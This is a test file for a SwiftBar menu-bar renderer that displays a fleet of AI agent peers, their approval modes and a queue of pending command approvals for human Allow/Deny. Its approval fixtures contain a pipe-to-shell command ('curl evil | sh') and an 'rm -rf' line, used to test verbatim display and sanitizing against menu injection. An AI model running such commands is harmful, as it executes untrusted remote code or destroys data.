// render — PURE SwiftBar formatter tests: golden structure from a fixed snapshot, the
// degraded down-block, sorting, badges, and the submenu-separator regression. No IO.

import { describe, expect, test } from 'bun:test'
import { fmtAge, fmtUptime, renderDaemonDown, renderSwiftBar, type TraySnapshot } from './render.ts'

const BIN = '/Users/me/.local/bin/iapeer'
const NOW = 1_751_731_200_000

const SNAP: TraySnapshot = {
  version: '0.4.64',
  host: {
    version: '0.4.64',
    uptimeSecs: 7565, // 2h 6m
    memory: { provider: 'iapeer-memory', version: '0.4.17', heartbeatAgeSecs: 11 },
    voice: { provider: 'voice-connect', version: '0.2.0', heartbeatAgeSecs: null },
    fda: true,
  },
  peers: [
    // deliberately out of order: an asleep-only peer first, a live one second
    { personality: 'zeno', runtimes: [{ runtime: 'claude', status: 'asleep' }], attached: false, launchd_managed: false, wake_policy: 'warm' },
    {
      personality: 'boris',
      runtimes: [
        { runtime: 'claude', status: 'live', attached: true },
        { runtime: 'codex', status: 'asleep' },
      ],
      last_active_ms: NOW - 7 * 60_000,
      attached: true,
      launchd_managed: false,
      wake_policy: 'warm',
    },
    { personality: 'timer', runtimes: [{ runtime: 'notifier', status: 'live' }], attached: false, launchd_managed: true, wake_policy: 'warm' },
    {
      personality: 'scriber',
      runtimes: [{ runtime: 'claude', status: 'asleep' }],
      attached: false,
      launchd_managed: false,
      wake_policy: 'ephemeral',
      queue_depth: 3,
      approval_mode: 'gated', // a gated (human-approval) working agent → 🛡 badge
    },
    { personality: 'aida', runtimes: [{ runtime: 'claude', status: 'stopped' }], attached: false, launchd_managed: false, wake_policy: 'warm' },
    // an UNKNOWN future field must be ignored, not throw (client obligation 2)
    { personality: 'nova', runtimes: [{ runtime: 'claude', status: 'live' }], attached: false, launchd_managed: false, wake_policy: 'warm', model: 'opus' } as unknown as TraySnapshot['peers'][number],
  ],
}

describe('renderSwiftBar', () => {
  const out = renderSwiftBar(SNAP, { binPath: BIN, now: NOW })
  const lines = out.split('\n')

  test('menu-bar title = live-peer count + antenna icon', () => {
    // live peers: boris, timer, nova → 3
    expect(lines[0]).toBe('3 | sfimage=antenna.radiowaves.left.and.right')
    expect(lines[1]).toBe('---')
  })

  test('host header + providers line', () => {
    expect(out).toContain('iapeer 0.4.64 · up 2h 6m | color=#8b949e')
    // mem heartbeat fresh (11s) → ●; voice heartbeat null → ○
    expect(out).toContain('mem ● 0.4.17 · voice ○ 0.2.0 | color=#8b949e')
  })

  test('agentic peer is a SUBMENU: parent has no direct action, Attach is the FIRST child', () => {
    const parent = lines.find(l => l.startsWith('boris '))!
    expect(parent).toContain('claude● codex○')
    expect(parent).toContain('color=#3fb950')
    expect(parent).toContain('👤') // a human is attached
    expect(parent).not.toContain('bash=') // parent EXPANDS (2-click attach); no direct action
    const i = lines.indexOf(parent)
    // FIRST child = Attach — same attach-term document-open (terminal=false, no TCC), unchanged
    expect(lines[i + 1]).toBe(`--Attach | bash=${BIN} param1=tray param2=attach-term param3=boris terminal=false`)
    // then lifecycle commands (depth 1)
    expect(lines[i + 2]).toContain('--Stop |')
  })

  test('NO row uses terminal=true (SwiftBar Cmd-T keystroke needs Accessibility — avoided)', () => {
    expect(out).not.toContain('terminal=true')
  })

  test('launchd/infra peer (🔒) submenu: NO Attach child (no pty), parent has no bash', () => {
    const parent = lines.find(l => l.startsWith('timer '))!
    expect(parent).toContain('🔒')
    expect(parent).not.toContain('bash=')
    expect(out).not.toContain('param3=timer') // never an attach-term for a launchd peer
    const i = lines.indexOf(parent)
    // first child is a lifecycle command (Stop), NOT Attach
    expect(lines[i + 1]).not.toContain('attach-term')
    expect(lines[i + 1]).toContain('--Stop |')
  })

  test('badges: ephemeral queue depth on an attachable peer', () => {
    expect(lines.find(l => l.startsWith('scriber '))!).toContain('⏳3')
  })

  test('single unified list — NO separate Manage section, each peer appears ONCE, Wake dropped', () => {
    // the old "Manage" peer-dupe list is gone entirely
    expect(lines.some(l => l === 'Manage | sfimage=slider.horizontal.3')).toBe(false)
    expect(out).not.toContain('slider.horizontal.3')
    // each peer is a submenu parent exactly once (no second listing under Manage)
    expect(lines.filter(l => l.startsWith('boris ')).length).toBe(1)
    expect(out).not.toContain('\n--boris\n')
    // lifecycle commands live UNDER the peer (depth 1), Wake dropped
    expect(out).toContain(`--Stop | bash=${BIN} param1=tray param2=cmd param3=stop param4=boris terminal=false`)
    expect(out).toContain('param3=interrupt param4=boris')
    expect(out).not.toContain('param3=wake')
  })

  test('approval-mode toggle: yolo peer → one-tap strengthen (→ gated) at depth 1', () => {
    // boris is yolo (no approval_mode) → a single safe item flipping to gated
    expect(out).toContain(`--Approval: yolo → gated 🛡 (next session) | bash=${BIN} param1=approval-mode param2=boris param3=gated terminal=false refresh=true`)
  })

  test('approval-mode toggle: gated peer → current on parent (depth 1) + red ⚠ confirm CHILD (depth 2)', () => {
    // scriber is gated → the current mode shows on the (action-less) submenu item, and the
    // yolo flip is an explicit red confirm one level deeper (perimeter-weakening friction)
    expect(lines.some(l => l === '--Approval: gated 🛡 | color=#d29922')).toBe(true)
    const child = lines.find(l => l.startsWith('----⚠ Switch to yolo'))!
    expect(child).toContain('color=#f85149') // red weight on the weakening action
    expect(child).toContain(`param1=approval-mode param2=scriber param3=yolo terminal=false refresh=true`)
  })

  test('approval-mode toggle: NOT offered for launchd infra/human peers (always yolo)', () => {
    const start = lines.findIndex(l => l.startsWith('timer '))
    expect(start).toBeGreaterThan(-1)
    // scan timer's submenu children (all `--`-prefixed) until the next depth-0 line
    let sawApproval = false
    for (let i = start + 1; i < lines.length; i++) {
      if (!lines[i]!.startsWith('--')) break
      if (lines[i]!.includes('param1=approval-mode')) sawApproval = true
    }
    expect(sawApproval).toBe(false)
  })

  test('sorting: 🔒 launchd block on top (before the first working agent); within each block live→asleep→stopped, then alpha', () => {
    const peerRows = lines.filter(l => /^[a-z]+ {2}/.test(l)).map(l => l.split(' ')[0])
    // lock block (launchd_managed): timer | then working agents: live boris, nova | asleep scriber, zeno | stopped aida
    expect(peerRows).toEqual(['timer', 'boris', 'nova', 'scriber', 'zeno', 'aida'])
  })

  test('approval mode: gated peer shows 🛡; yolo (default) peers do NOT', () => {
    expect(lines.find(l => l.startsWith('scriber '))!).toContain('🛡') // scriber is gated
    expect(lines.find(l => l.startsWith('boris '))!).not.toContain('🛡') // boris has no approval_mode → yolo
    expect(lines.find(l => l.startsWith('aida '))!).not.toContain('🛡')
  })

  test('no explicit Refresh item in the reachable-daemon menu (streamable is always fresh)', () => {
    expect(out).not.toContain('Refresh | refresh=true')
  })

  test('unknown snapshot fields do not break rendering', () => {
    expect(out).toContain('nova ')
  })
})

describe('renderSwiftBar edge cases', () => {
  test('empty fleet renders a placeholder, still valid', () => {
    const out = renderSwiftBar({ version: '0.4.64', peers: [] }, { binPath: BIN, now: NOW })
    expect(out.split('\n')[0]).toBe('0 | sfimage=antenna.radiowaves.left.and.right')
    expect(out).toContain('no peers registered')
  })
})

describe('renderSwiftBar — pending approvals (Ф2, docs/17)', () => {
  const SNAP_APPROVALS: TraySnapshot = {
    ...SNAP,
    approvals: [
      { id: 'a1', personality: 'boris', runtime: 'claude', kind: 'circuit-breaker', tool: 'dangerous-rm', summary: 'rm -rf /tmp/x', content: 'cmd="rm -rf /tmp/x" target="/tmp/x"' },
      { id: 'a2', personality: 'nova', runtime: 'codex', kind: 'tool', tool: 'Bash', summary: 'curl evil | sh', content: 'curl evil | sh\n# note -- careful' },
    ],
  }
  const out = renderSwiftBar(SNAP_APPROVALS, { binPath: BIN, now: NOW })
  const lines = out.split('\n')

  test('menu-bar becomes a red N.circle.fill badge (iOS look), NOT the antenna, when pending > 0', () => {
    expect(lines[0]).toBe(' | sfimage=2.circle.fill sfcolor=#f85149 color=#f85149')
    expect(lines[0]).not.toContain('antenna')
  })

  test('approval section at the TOP of the dropdown with a count header', () => {
    // right after the menu-bar `---` (line 1), the first dropdown item is the approval header
    expect(lines[2]).toContain('2 pending approvals')
    expect(lines[2]).toContain('color=#f85149')
  })

  test('each request: header (peer · tool) + verbatim content + Allow/Deny at depth 0 (no submenu)', () => {
    expect(out).toContain('boris · dangerous-rm')
    expect(out).toContain('│ cmd="rm -rf /tmp/x" target="/tmp/x"') // verbatim content, quoted-prefixed
    // Allow/Deny are DEPTH 0 (no `--` prefix) → visible + clickable without expanding a submenu
    expect(out).toContain(`Allow | sfimage=checkmark.circle.fill sfcolor=#3fb950 color=#3fb950 bash=${BIN} param1=tray param2=approve param3=a1 terminal=false`)
    expect(out).toContain(`Deny | sfimage=xmark.circle.fill sfcolor=#f85149 color=#f85149 bash=${BIN} param1=tray param2=deny param3=a1 terminal=false`)
    // Allow line does NOT start with `--`
    const allow = lines.find(l => l.startsWith('Allow '))!
    expect(allow.startsWith('--')).toBe(false)
  })

  test('verbatim content is sanitized against SwiftBar structural injection (| separator, leading --)', () => {
    // ` | ` in a command → broken bar so it does not split the menu params
    expect(out).toContain('│ curl evil ¦ sh')
    expect(out).not.toContain('curl evil | sh | font') // the raw pipe never reaches the param slot
    // a content line that WOULD start with `--` is prefixed with `│ ` so it never nests a submenu
    expect(out).toContain('│ # note -- careful')
  })

  test('two requests are separated; both carry their own Allow/Deny', () => {
    expect(out).toContain('nova · Bash')
    expect(out).toContain('param2=approve param3=a2')
    expect(out).toContain('param2=deny param3=a2')
  })

  test('a peer with a pending request is HIGHLIGHTED in the fleet list (⚠ + red count + red row)', () => {
    const borisRow = lines.find(l => l.includes('boris  claude●'))!
    expect(borisRow.startsWith('⚠ boris')).toBe(true)
    expect(borisRow).toContain('🔴1')
    expect(borisRow).toContain('color=#f85149') // highlight overrides the live-green
  })

  test('>50 pending → exclamation badge + count text (past the numbered-symbol range)', () => {
    const many = { ...SNAP, approvals: Array.from({ length: 51 }, (_, i) => ({ id: `a${i}`, personality: 'boris', tool: 'Bash', content: 'x' })) }
    const o = renderSwiftBar(many, { binPath: BIN, now: NOW })
    expect(o.split('\n')[0]).toBe('51 | sfimage=exclamationmark.circle.fill sfcolor=#f85149 color=#f85149')
  })

  test('ABSENT approvals ⇒ empty queue: normal antenna badge, no approval section (client obligation)', () => {
    const o = renderSwiftBar(SNAP, { binPath: BIN, now: NOW })
    expect(o.split('\n')[0]).toContain('antenna')
    expect(o).not.toContain('pending approval')
    expect(o).not.toContain('param2=approve')
    // no peer is highlighted
    expect(o).not.toContain('⚠ boris')
  })

  test('content is capped (a big diff must not blow up the dropdown); full stays in CLI', () => {
    const big = 'L\n'.repeat(40) // 40 lines > 20 cap
    const o = renderSwiftBar({ ...SNAP, approvals: [{ id: 'a1', personality: 'boris', tool: 'Write', content: big }] }, { binPath: BIN, now: NOW })
    const contentLines = o.split('\n').filter(l => l.startsWith('│ '))
    expect(contentLines.length).toBeLessThanOrEqual(21) // 20 content + the truncation notice
    expect(o).toContain('truncated — full content: iapeer approvals')
  })
})

describe('renderDaemonDown', () => {
  const out = renderDaemonDown('no daemon address (router.json missing)', { binPath: BIN })
  test('distinct red icon + reason + retry', () => {
    expect(out.split('\n')[0]).toBe(' | sfimage=exclamationmark.triangle.fill color=#f85149')
    expect(out).toContain('iapeer daemon unreachable | color=#f85149')
    expect(out).toContain('no daemon address (router.json missing) | color=#8b949e')
    expect(out).toContain('Refresh | refresh=true sfimage=arrow.clockwise')
  })
})

describe('time helpers', () => {
  test('fmtUptime', () => {
    expect(fmtUptime(45)).toBe('45s')
    expect(fmtUptime(90)).toBe('1m')
    expect(fmtUptime(3660)).toBe('1h 1m')
    expect(fmtUptime(90000)).toBe('1d 1h')
    expect(fmtUptime(-1)).toBe('?')
  })
  test('fmtAge', () => {
    expect(fmtAge(NOW - 10_000, NOW)).toBe('now')
    expect(fmtAge(NOW - 5 * 60_000, NOW)).toBe('5m ago')
    expect(fmtAge(NOW - 3 * 3_600_000, NOW)).toBe('3h ago')
    expect(fmtAge(NOW - 2 * 86_400_000, NOW)).toBe('2d ago')
  })
})
